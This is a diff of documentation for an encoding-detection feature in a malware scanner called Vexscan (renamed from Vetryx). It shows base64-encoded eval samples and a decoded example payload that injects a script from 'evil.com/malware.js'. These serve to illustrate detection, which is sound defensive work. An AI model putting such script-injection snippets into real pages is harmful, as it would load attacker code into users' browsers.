@@ -1,6 +1,7 @@
 # Encoding Detection
 
-Vetryx automatically detects and decodes obfuscated content to find hidden malicious payloads. This is crucial because attackers frequently use encoding to evade pattern matching.
+Vexscan automatically detects and decodes obfuscated content to find hidden malicious payloads. This is crucial because
+attackers frequently use encoding to evade pattern matching.
 
 ## How It Works
 
@@ -18,6 +19,7 @@ Vetryx automatically detects and decodes obfuscated content to find hidden malic
 ```
 
 The decoder:
+
 1. Scans content for encoded patterns
 2. Decodes each pattern
 3. Recursively decodes the result (up to 3 layers by default)
@@ -111,7 +113,7 @@ Attackers often stack multiple encoding layers:
 "eval('malicious code')"
 ```
 
-Vetryx decodes recursively (default: 3 layers deep).
+Vexscan decodes recursively (default: 3 layers deep).
 
 ## Finding Report
 
@@ -119,15 +121,15 @@ When encoded malicious content is found:
 
 ```json
 {
-    "rule_id": "OBFUSC-PAYLOAD",
-    "title": "Malicious content hidden in base64 encoding",
-    "description": "Decoded base64 content contains suspicious patterns: Direct eval() usage",
-    "severity": "critical",
-    "metadata": {
-        "encoding": "base64",
-        "decode_depth": "2"
-    },
-    "snippet": "Encoded: ZXZhbCgn...\nDecoded: eval('malicious code')"
+  "rule_id": "OBFUSC-PAYLOAD",
+  "title": "Malicious content hidden in base64 encoding",
+  "description": "Decoded base64 content contains suspicious patterns: Direct eval() usage",
+  "severity": "critical",
+  "metadata": {
+    "encoding": "base64",
+    "decode_depth": "2"
+  },
+  "snippet": "Encoded: ZXZhbCgn...\nDecoded: eval('malicious code')"
 }
 ```
 
@@ -147,9 +149,9 @@ Entropy analysis is disabled by default (too many false positives) but can be en
 
 ```rust
 AnalyzerConfig {
-    enable_entropy: true,
-    entropy_threshold: 5.5,
-    min_entropy_length: 50,
+enable_entropy: true,
+entropy_threshold: 5.5,
+min_entropy_length: 50,
 }
 ```
 
@@ -157,9 +159,9 @@ AnalyzerConfig {
 
 ```rust
 AnalyzerConfig {
-    max_decode_depth: 3,      // Maximum recursive decode layers
-    analyze_decoded: true,    // Apply rules to decoded content
-    // ...
+max_decode_depth: 3,      // Maximum recursive decode layers
+analyze_decoded: true,    // Apply rules to decoded content
+// ...
 }
 ```
 
@@ -169,7 +171,7 @@ The `decode` command manually decodes content:
 
 ```bash
 # Decode a base64 string
-vetryx decode "ZXZhbCgnbWFsaWNpb3VzIGNvZGUnKQ=="
+vexscan decode "ZXZhbCgnbWFsaWNpb3VzIGNvZGUnKQ=="
 
 # Output
 Encoding: base64
@@ -190,13 +192,16 @@ atob(_0x1234[0]);
 
 // After decoding:
 eval("(function(){
-    var s=document.createElement('script');
-    s.src='https://evil.com/malware.js';
-    document.body.appendChild(s);
-})()")
+var s = document.createElement('script');
+s.src = 'https://evil.com/malware.js';
+document.body.appendChild(s);
+})
+()
+")
 ```
 
-Vetryx output:
+Vexscan output:
+
 ```
 CRITICAL  OBFUSC-PAYLOAD  Malicious content hidden in base64 encoding
           File: malware.js:3
